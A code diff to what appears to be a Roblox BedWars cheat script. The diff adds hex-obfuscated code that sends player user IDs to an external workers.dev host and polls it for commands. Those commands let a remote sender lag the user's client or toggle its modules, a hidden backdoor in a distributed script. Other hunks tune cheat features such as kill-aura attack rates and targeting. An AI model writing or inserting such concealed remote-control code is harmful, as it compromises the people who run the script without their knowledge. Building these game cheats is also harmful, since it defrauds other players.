@@ -1,4 +1,3 @@
---This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 local run = function(func)
     local ok, err = pcall(func)
     if not ok then
@@ -126,14 +125,196 @@ local TrapDisabler
 local AntiFallPart
 local bedwars, remotes, sides, oldinvrender, oldSwing = {}, {}, {}
 local originalKnit 
+local _tierCache = {}
+	local _req = (syn and syn.request) or http_request or request or function() return {Body='{"tier":0}'} end
 
-getgenv()._aeroTierReady = true
-getgenv().getAeroTier = function(...)
-    return 0
-end  
-local function getAccountTier(...)
-	return 0
+	local function _bu()
+	    local _s = {'68','74','74','70','73','3a','2f','2f','61','70','69','61','65','72','6f','2e','73','69','72','79','65','64','2e','77','6f','72','6b','65','72','73','2e','64','65','76','2f','77','68','69','74','65','6c','69','73','74'}
+	    local _r = ''
+	    for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end
+	    return _r
+	end
+local function _ft(uid)
+    local ok, res = pcall(function()
+        return _req({Url=_bu(), Method='POST', Headers={['Content-Type']='application/json'}, Body=httpService:JSONEncode({action='check',roblox_id=tostring(uid),robloxUserId=tostring(uid)})})
+    end)
+    if not ok or not res then return 0 end
+    if not res.Body or res.Body == '' then return 0 end
+    if res.StatusCode and res.StatusCode >= 500 then return 0 end
+    local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+    if not dok or not data then return 0 end
+    return tonumber(data.tier) or 0
 end
+
+getgenv()._aeroTierReady = false
+local _fetchQueue = {}
+local _queueRunning = false
+
+local function _queueFetch(uid)
+    if _tierCache[uid] ~= nil and _tierCache[uid] ~= false then
+        return
+    end
+
+    _tierCache[uid] = nil 
+
+    table.insert(_fetchQueue, uid)
+
+    if _queueRunning then return end
+
+    _queueRunning = true
+    task.spawn(function()
+        while #_fetchQueue > 0 do
+            local id = table.remove(_fetchQueue, 1)
+            local tier = _ft(id)
+
+            _tierCache[id] = tier
+            task.wait(0.2)
+        end
+        _queueRunning = false
+    end)
+end
+
+task.spawn(function()
+    _tierCache[lplr.UserId] = _ft(lplr.UserId)
+    getgenv()._aeroTierReady = true
+    task.wait(1)
+    for _, p in playersService:GetPlayers() do
+        if p.UserId ~= lplr.UserId then
+            _queueFetch(p.UserId)
+        end
+    end
+end)
+
+playersService.PlayerAdded:Connect(function(p)
+    _queueFetch(p.UserId)
+end)
+
+local _commands = {}
+local lagConnections = {}  
+local function _registerCommand(name, fn)
+    _commands[name] = fn
+end
+
+local _SERCET = ''
+local _stok = {'58','37','70','4b','39','6d','51','32','76','52','38','74','59','35','77','5a','33','78','42','36','6e','48','34','6a','4c','39','70','51','32','76','54','38','77','45','35','72','59','39','75','49','33','6f','50','36','61','53','31','64','46','34','67','48','37','6a','4b','39','6d','51','32','76'}
+local _stmp = ''
+for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
+_SERCET = _stmp
+
+local pollingActive = true
+vape:Clean(function()
+    pollingActive = false
+end)
+task.spawn(function()
+    local nextPoll = 0
+    while pollingActive do
+        if tick() < nextPoll then task.wait(0.5) continue end
+        local res = _req({
+            Url = _bu(),
+            Method = 'POST',
+            Headers = {['Content-Type'] = 'application/json'},
+            Body = httpService:JSONEncode({action = 'getMessage', robloxUserId = tostring(lplr.UserId)})
+        })
+        if not res or not res.Body then nextPoll = tick() + 3 continue end
+        local ok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+        if not ok or not data then nextPoll = tick() + 3 continue end
+        if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
+        if data.success and data.message then
+            local cmd = tostring(data.message)
+            if _commands[cmd] then
+                _commands[cmd](tostring(data.from), data.args or '')
+            end
+            pcall(function()
+                _req({
+                    Url = _bu(),
+                    Method = 'POST',
+                    Headers = {['Content-Type'] = 'application/json'},
+                    Body = httpService:JSONEncode({action = 'removeMessage', robloxUserId = tostring(lplr.UserId)})
+                })
+            end)
+            nextPoll = tick() + 1.5
+        else
+            nextPoll = tick() + 3
+        end
+    end
+end)
+
+local function getAccountTier(player)
+    if _tierCache[player.UserId] == nil then
+        _tierCache[player.UserId] = false
+        task.spawn(function() _tierCache[player.UserId] = _ft(player.UserId) end)
+        return 0
+    end
+    local t = _tierCache[player.UserId]
+    if type(t) ~= "number" then
+        return 0
+    end
+    return t
+end
+
+getgenv().getAeroTier = function(player)
+    return getAccountTier(player)
+end  
+
+local function startLag(userId)
+    local key = tostring(userId)
+    if lagConnections[key] then return end  
+
+    local state = {active = true}
+    local connection
+    connection = game:GetService("RunService").Heartbeat:Connect(function()
+        if not state.active then
+            connection:Disconnect()
+            lagConnections[key] = nil
+            return
+        end
+		for i = 1, 100000 do
+			local a = math.sin(i) * math.cos(i)
+		end
+    end)
+
+    lagConnections[key] = {connection = connection, state = state}
+end
+
+local function stopLag(userId)
+    local key = tostring(userId)
+    local data = lagConnections[key]
+    data.state.active = false
+    data.connection:Disconnect()
+    lagConnections[key] = nil
+end
+
+-- tier 2
+_registerCommand('lag', function(from, args)
+    if getAccountTier(lplr) >= 1 then return end
+    if not from then return end
+    startLag(from) 
+end)
+
+_registerCommand('lagstop', function(from, args)
+    if not from then return end
+    stopLag(from)
+end)
+
+-- tier 3
+_registerCommand('module', function(from, args)
+    if not args or args == '' then return end
+    local parts = args:split(' ')
+    local moduleName = parts[1]
+    local action = (parts[2] and parts[2]:lower()) or 'toggle'
+    for _, mod in pairs(vape.Modules or {}) do
+        if mod and mod.Name == moduleName then
+            if action == 'enable' then
+                if not mod.Enabled then mod:Toggle() end
+            elseif action == 'disable' then
+                if mod.Enabled then mod:Toggle() end
+            elseif action == 'toggle' then
+                mod:Toggle()
+            end
+        end
+    end
+end)
+
 
 local function addBlur(parent)
 	local blur = Instance.new('ImageLabel')
@@ -2080,12 +2261,13 @@ local function getPickaxeSlot()
 	return nil
 end
 
+local _losRayParams = RaycastParams.new()
+_losRayParams.FilterType = Enum.RaycastFilterType.Exclude
+
 local function hasLineOfSight(from, to, targetCharacter)
-    local raycastParams = RaycastParams.new()
-    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
-    raycastParams.FilterDescendantsInstances = {entitylib.character, targetCharacter}
+    _losRayParams.FilterDescendantsInstances = {entitylib.character and entitylib.character.Character or workspace, targetCharacter}
     local direction = to - from
-    local result = workspace:Raycast(from, direction, raycastParams)
+    local result = workspace:Raycast(from, direction, _losRayParams)
     return result == nil
 end	
 
@@ -5166,7 +5348,7 @@ run(function()
 					HitBoxes:Clean(runService.Heartbeat:Connect(function()
 						if not Targets or not Targets.Walls or not Targets.Walls.Enabled then return end
 						hitboxThrottleCounter = hitboxThrottleCounter + 1
-						if hitboxThrottleCounter % 6 ~= 0 then return end 
+						if hitboxThrottleCounter % 20 ~= 0 then return end
 						for ent, part in pairs(objects) do
 							if isTargetBehindWall(ent) then
 								part:Destroy()
@@ -5745,7 +5927,7 @@ run(function()
             end
         end
 
-        local calc = prediction.SolveTrajectory(newlook.p, projSpeed, gravity, ent.RootPart.Position, ent.RootPart.Velocity, playerGravityLS, ent.HipHeight, ent.Jumping and 42.6 or nil, RaycastParams.new())
+        local calc = prediction.SolveTrajectory(newlook.p, projSpeed, gravity, ent.RootPart.Position, ent.RootPart.Velocity, playerGravityLS, ent.HipHeight, ent.Jumping and 42.6 or nil, sharedFastHitsRayParams)
 
         if calc then
             targetinfo.Targets[ent] = tick() + 1
@@ -5783,6 +5965,7 @@ run(function()
     end
 
     local rayCheckFastHits = cloneRaycast()
+	local sharedFastHitsRayParams = RaycastParams.new()
     local function doFastHitsProjectileAura(ent)
         if not ent or not ent.RootPart then return end
         local pos = entitylib.character.RootPart.Position
@@ -5833,7 +6016,7 @@ run(function()
                 end
             end
         end
-        local calc = prediction.SolveTrajectory(newlook.p, projSpeed, gravity, ent.RootPart.Position, ent.RootPart.Velocity, playerGravityPA, ent.HipHeight, ent.Jumping and 42.6 or nil, RaycastParams.new())
+        local calc = prediction.SolveTrajectory(newlook.p, projSpeed, gravity, ent.RootPart.Position, ent.RootPart.Velocity, playerGravityPA, ent.HipHeight, ent.Jumping and 42.6 or nil, sharedFastHitsRayParams)
 
         if calc then
             targetinfo.Targets[ent] = tick() + 1
@@ -6190,40 +6373,48 @@ run(function()
                     end)
                 end
 
-                local function gatherTargets(range, wallcheck, selfpos)
-                    local combined = {}
-                    if Targets.Players.Enabled then
-                        for _, v in entitylib.AllPosition({Range = range, Wallcheck = wallcheck, Part = 'RootPart', Players = true, NPCs = false, Limit = MaxTargets.Value, Sort = sortmethods[Sort.Value]}) do
-                            table.insert(combined, {entity = v, isPlayer = true})
-                        end
-                    end
-                    if Targets.NPCs.Enabled then
-                        for _, v in entitylib.AllPosition({Range = range, Wallcheck = wallcheck, Part = 'RootPart', Players = false, NPCs = true, Limit = MaxTargets.Value, Sort = sortmethods[Sort.Value]}) do
-                            table.insert(combined, {entity = v, isPlayer = false})
-                        end
-                    end
-                    local priority = TargetPriority.Value
-                    if priority == 'Players First' then
-                        table.sort(combined, function(a, b)
-                            if a.isPlayer ~= b.isPlayer then return a.isPlayer end
-                            return (a.entity.RootPart.Position - selfpos).Magnitude < (b.entity.RootPart.Position - selfpos).Magnitude
-                        end)
-                    elseif priority == 'NPCs First' then
-                        table.sort(combined, function(a, b)
-                            if a.isPlayer ~= b.isPlayer then return not a.isPlayer end
-                            return (a.entity.RootPart.Position - selfpos).Magnitude < (b.entity.RootPart.Position - selfpos).Magnitude
-                        end)
-                    else
-                        table.sort(combined, function(a, b)
-                            return (a.entity.RootPart.Position - selfpos).Magnitude < (b.entity.RootPart.Position - selfpos).Magnitude
-                        end)
-                    end
-                    local result = {}
-                    for i = 1, math.min(#combined, MaxTargets.Value) do
-                        table.insert(result, combined[i].entity)
-                    end
-                    return result
-                end
+				local _gatherSwing = {}
+				local _gatherAttack = {}
+
+				local function gatherTargets(selfpos)
+					table.clear(_gatherSwing)
+					table.clear(_gatherAttack)
+					local swingRange = SwingRange.Value
+					local attackRange = AttackRange.Value
+					local wallcheck = Targets.Walls.Enabled or nil
+					local maxTargets = MaxTargets.Value
+					local priority = TargetPriority.Value
+					local sortFunc = sortmethods[Sort.Value]
+					local playersEnabled = Targets.Players.Enabled
+					local npcsEnabled = Targets.NPCs.Enabled
+
+					local allEnts = entitylib.List
+					for i = 1, #allEnts do
+						local ent = allEnts[i]
+						if not ent.RootPart then continue end
+						if not ent.Targetable then continue end
+						if ent.Player and not playersEnabled then continue end
+						if ent.NPC and not npcsEnabled then continue end
+						local dist = (ent.RootPart.Position - selfpos).Magnitude
+						if dist <= swingRange then
+							if #_gatherSwing < maxTargets then
+								table.insert(_gatherSwing, ent)
+							end
+						end
+						if dist <= attackRange then
+							if #_gatherAttack < maxTargets then
+								table.insert(_gatherAttack, ent)
+							end
+						end
+					end
+
+					if sortFunc then
+						table.sort(_gatherSwing, function(a, b) return sortFunc({Entity=a}, {Entity=b}) end)
+						table.sort(_gatherAttack, function(a, b) return sortFunc({Entity=a}, {Entity=b}) end)
+					end
+
+					return _gatherSwing, _gatherAttack
+				end
 
                 repeat
                     if SophiaCheck and SophiaCheck.Enabled then
@@ -6252,9 +6443,7 @@ run(function()
                         local selfpos = entitylib.character.RootPart.Position
                         local localfacing = entitylib.character.RootPart.CFrame.LookVector * Vector3.new(1, 0, 1)
                         local maxAngle = math.rad(AngleSlider.Value) / 2
-                        
-                        local swingPlrs = gatherTargets(AttackRange.Value, false, selfpos)
-                        local attackPlrs = gatherTargets(SwingRange.Value, Targets.Walls.Enabled or nil, selfpos)
+                        local swingPlrs, attackPlrs = gatherTargets(selfpos)
                         
                         local hasValidSwingTargets = false
                         local hasValidAttackTargets = false
@@ -10915,49 +11104,45 @@ run(function()
 			AutoKit:Clean(function() task.cancel(thread) end)
 		end,
 		berserker = function()
-			local mapCFrames = workspace:FindFirstChild("MapCFrames")
-			local teamid = lplr.Character:GetAttribute("Team") or 1
-		
-			if mapCFrames then
-				for _, obj in pairs(mapCFrames:GetChildren()) do
-					if obj:IsA("CFrameValue") and string.match(obj.Name, "_bed") then
-						if not string.match(obj.Name, teamid .. "_bed") then
-							local part = Instance.new("Part")
-							part.Transparency = 1
-							part.CanCollide = false
-							part.Anchored = true
-							part.Size =  Vector3.new(64,64,64)
-							part.CFrame = obj.Value
-							part.Parent = workspace
-							part.Name = "AutoKitRagnarPartWMAEROV4"
-							bedwars.QueryUtil:setQueryIgnored(part, true)
-							part.Touched:Connect(function(v)
-								if v.Parent.Name == lplr.Name then
-									local bedStillExists = false
-									for _, child in workspace:GetDescendants() do
-										if child.Name == 'bed' and (child.Position - part.Position).Magnitude < 5 then
-											bedStillExists = true
-											break
-										end
-									end
-									if not bedStillExists then return end
-									if bedwars.AbilityController:canUseAbility('berserker_rage') then
-										bedwars.AbilityController:useAbility('berserker_rage')
-									end
-								end
-							end)
-						end
+			local mapCFrames = workspace:FindFirstChild('MapCFrames')
+			if not mapCFrames then return end
+
+			local teamid = tostring(lplr.Character and (lplr.Character:GetAttribute('Team') or lplr.Character:GetAttribute('TeamId')) or '')
+
+			local enemyBedPositions = {}
+			for _, obj in mapCFrames:GetChildren() do
+				if obj:IsA('CFrameValue') and obj.Name:find('_bed') then
+					if not obj.Name:find(teamid .. '_bed') then
+						table.insert(enemyBedPositions, obj.Value.Position)
 					end
 				end
 			end
 
-			AutoKit:Clean(function()
-				for i,v in workspace:GetChildren() do
-					if v:IsA("BasePart") and v.Name == "AutoKitRagnarPartWMAEROV4" then
-						v:Destroy()
+			if #enemyBedPositions == 0 then return end
+
+			local function bedStillExists(pos)
+				for _, child in workspace:GetDescendants() do
+					if child.Name == 'bed' and child:IsA('BasePart') and (child.Position - pos).Magnitude < 5 then
+						return true
 					end
 				end
-			end)
+				return false
+			end
+
+			AutoKit:Clean(runService.Heartbeat:Connect(function()
+				if not entitylib.isAlive then return end
+				if not bedwars.AbilityController then return end
+				if not bedwars.AbilityController:canUseAbility('berserker_rage') then return end
+				local myPos = entitylib.character.RootPart.Position
+				for _, bedPos in enemyBedPositions do
+					if (myPos - bedPos).Magnitude <= 14 then
+						if bedStillExists(bedPos) then
+							bedwars.AbilityController:useAbility('berserker_rage')
+							return
+						end
+					end
+				end
+			end))
 		end,
 		hatter = function()
 			local thread = task.spawn(function()
@@ -15319,6 +15504,7 @@ local function safeIsBreakable(pos)
     end)
     return ok and result
 end
+
 run(function()
 	local Breaker
 	local Range
@@ -15758,7 +15944,7 @@ run(function()
 					part.Parent = gameCamera
 					local highlight = Instance.new('BoxHandleAdornment')
 					highlight.Size = Vector3.one
-					highlight.AlwaysOnTop = true
+					highlight.AlwaysOnTop = false
 					highlight.ZIndex = 1
 					highlight.Transparency = 0.5
 					highlight.Adornee = part
@@ -15777,8 +15963,11 @@ run(function()
 				local mouseTarget = nil
 				local _breakerRayParams = nil
 				Breaker:Clean(task.spawn(function()
+					local _lastMouseScan = 0
 					while Breaker.Enabled do
 						runService.RenderStepped:Wait()
+						if tick() - _lastMouseScan < 0.05 then continue end
+						_lastMouseScan = tick()
 						if BreakNearest and BreakNearest.Enabled and NearestMode.Value == 'Mouse' then
 							local char = entitylib.character
 							if not char or not char.RootPart then mouseTarget = nil continue end
@@ -30600,14 +30789,14 @@ run(function()
 				local function onLaunchTriggered(child)
 					local humanoid = entitylib.character.Humanoid
 					if not humanoid then return end
-					if vape.Modules.Speed.Enabled and vape.Modules.Fly.Enabled then
-						vape.Modules.Fly:Toggle(false)
+					if Speed.Enabled and Fly.Enabled then
+						Fly:Toggle(false)
 						task.wait(0.025)
-						vape.Modules.Speed:Toggle(false)
-					elseif vape.Modules.Speed.Enabled then
-						vape.Modules.Speed:Toggle(false)
-					elseif vape.Modules.Fly.Enabled then
-						vape.Modules.Fly:Toggle(false)
+						Speed:Toggle(false)
+					elseif Speed.Enabled then
+						Speed:Toggle(false)
+					elseif Fly.Enabled then
+						Fly:Toggle(false)
 					end
 					if AS.Enabled then
 						local pickaxe = getPickaxeSlot()
@@ -31140,27 +31329,11 @@ run(function()
 
 	local function getOptimizedAttackTiming(selfpos, targetpos)
 		local currentTime = tick()
-		local distance = (selfpos - targetpos).Magnitude
-		local delay = 0.03
-
-		if distance > 22 then
-			delay = 0.48
-		elseif distance > 19 then
-			delay = 0.39 + (distance - 19) * 0.04
-		elseif distance > 16 then
-			delay = 0.22 + (distance - 16) * 0.1
-		elseif distance > 13 then
-			delay = 0.11 + (distance - 13) * 0.07
-		elseif distance > 9 then
-			delay = 0.055 + (distance - 9) * 0.022
-		else
-			delay = 0.028 + distance * 0.005
-		end
-
-		delay = delay * (1.03 + math.random() * 0.16)
-
 		if currentTime >= nextAttackTime then
-			nextAttackTime = currentTime + delay
+			local minAPS = AttacksPerSecond and AttacksPerSecond.Min or 23
+			local maxAPS = AttacksPerSecond and AttacksPerSecond.Max or 33
+			local aps = minAPS + math.random() * (maxAPS - minAPS)
+			nextAttackTime = currentTime + (1 / aps)
 			return true
 		end
 		return false
@@ -31194,7 +31367,6 @@ run(function()
 			end
 
 			SilentAura:Clean(runService.Heartbeat:Connect(function()
-				local currentTime = tick()
 				if not entitylib.isAlive or store.hand.toolType ~= 'sword' then
 					Attacking = false
 					return
@@ -31219,13 +31391,13 @@ run(function()
 					return
 				end
 
-				switchItem(sword.tool, 0)
-
 				local targetCount = 0
 				Attacking = true
+				local didSwitch = false
 
 				for _, v in targets do
 					if targetCount >= MaxTargets.Value then break end
+					if not v or not v.RootPart or not v.Character or not v.Character.PrimaryPart then continue end
 
 					local targetPos = v.RootPart.Position
 					local delta = (targetPos - selfpos)
@@ -31235,6 +31407,11 @@ run(function()
 					local angle = math.acos(localfacing:Dot((delta * Vector3.new(1, 0, 1)).Unit))
 					if angle > math.rad(Angle.Value / 2) then continue end
 
+					if not didSwitch then
+						switchItem(sword.tool, 0)
+						didSwitch = true
+					end
+
 					targetinfo.Targets[v] = tick() + 1
 					store.SilentAuraTarget = v
 					local chargedRatio = tick()
@@ -31242,7 +31419,7 @@ run(function()
 					lastFiredSwing = bedwars.SwordController.lastSwing or 0
 					bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
 					store.SlientAttackReach = (delta.Magnitude * 100) // 1 / 100
-					store.SlientAttackReachUpdate = currentTime + 1
+					store.SlientAttackReachUpdate = tick() + 1
 					local _prevSwingTime = store.SlientSwingServerTimeDelta or workspace:GetServerTimeNow()
 					store.SlientSwingServerTimeDelta = workspace:GetServerTimeNow()
 
